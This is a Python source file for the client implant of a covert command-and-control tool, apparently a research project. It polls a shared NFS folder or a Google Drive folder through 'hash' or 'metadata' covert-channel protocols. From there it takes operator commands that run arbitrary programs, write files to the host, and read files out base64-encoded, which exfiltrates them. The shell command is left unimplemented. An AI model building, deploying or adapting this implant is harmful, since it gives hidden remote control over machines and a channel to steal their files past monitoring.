import subprocess
import os

from src.mediums.linux_filesystem import LinuxFileSystem
from src.mediums.drive_filesystem import GoogleDriveFilesystem
from src.protocol.hash_protocol import HashProtocol
from src.protocol.metadata_protocol import MetadataProtocol

from src.utils import decode_base64, encode_base64

# default_linux_path = "/home/futureleader/Research/hash_cc/fileshare/"
default_linux_path = "/home/futureleader/Research/metasploit-framework/fileshare/"
default_creds = "creds/credentials.json"
default_folder_id = "1KBwGwewMn74HOKVTZrZup3ewc-Lv_cAV"


def select_filesystem():
    print("Select filesystem:")
    print("  1) Linux / NFS (default)")
    print("  2) Google Drive")
    choice = input("Choice (default Linux/NFS): ").strip() or "1"

    if choice == "2":

        folder_id = input(f"Enter Google Drive folder ID (default: {default_folder_id}): ").strip(
        ) or default_folder_id
        fs = GoogleDriveFilesystem(default_creds, folder_id)

    else:
        path = input(f"Enter mounted Linux path (default: {default_linux_path}): ").strip(
        ) or default_linux_path
        fs = LinuxFileSystem(path)
    return fs


def select_protocol(fs):
    print("Select covert channel protocol:")
    print("  1) Hash protocol (default)")
    print("  2) Metadata protocol")
    choice = input("Choice (default Metadata): ").strip() or "1"

    if choice == "2":
        return MetadataProtocol(fs)
    
    else:
        return HashProtocol(fs)


fs = select_filesystem()
cc = select_protocol(fs)


# CLIENT C2 CAPABILITES
def download_file(filename: bytes) -> bytes:
    try:
        with open(filename.decode(), 'rb') as fil:
            filedata = fil.read()
            #TO DO: base64 encode
            filedata = encode_base64(filedata)
            return b'success ' + filedata
    except Exception:
        return b'failed'


def upload_file(filename: bytes, filedata: bytes) -> bytes:
    try:
        with open(filename.decode(), 'wb') as fil:
            fil.write(decode_base64(filedata))
            return b'success'
    except Exception as e:
        print(e)
        return b'failed'


def run_command(cmd: bytes) -> str:
    try:
        sub = subprocess.run(
            cmd,
            capture_output=True
        )
        out = sub.stdout
        err = sub.stderr

        if len(err):
            out = out + b'\n' + err
    except Exception as e:
        out = str(e).encode()
    return out


def run_shell():
    # not implemented
    pass


if __name__ == "__main__":
    cc.connect()

    while True:
        # parse input
        line = cc.read()
        # get the first arg
        cmd = line.decode().strip().split(' ', 1)[0]
        print(f"\nRECEIVED COMMAND: {cmd} ({line})")
        out = b'no output.'

        # QUIT COMMAND
        if cmd == "quit" or cmd == "exit":
            print("Exiting...")
            exit()

        # LS COMMAND
        elif cmd in ["ls", "cat", "ps", "pwd"]:
            cmd_args = line.split()
            out = run_command(cmd_args)

        # CD COMMAND
        elif cmd == "cd":
            cmd_args = line.split()
            try:
                os.chdir(cmd_args[1])
            except Exception:
                pass
            out = b'pwd: ' + os.getcwd().encode()

        # EXECUTE COMMAND
        elif cmd == "execute":
            cmd_args = line.split()
            print(f'Running command:', cmd_args[1:])
            out = run_command(cmd_args[1:])

        # UPLOAD COMMAND
        elif cmd == "upload":
            cmd, filename, filedata = line.split(b' ', 2)
            out = upload_file(filename, filedata)

        # DOWNLOAD COMMAND
        elif cmd == "download":
            cmd, filename = line.split(b' ', 1)
            out = download_file(filename)

        # SHELL COMMAND
        elif cmd == "shell":
            # not implemented
            pass

        cc.write(out)
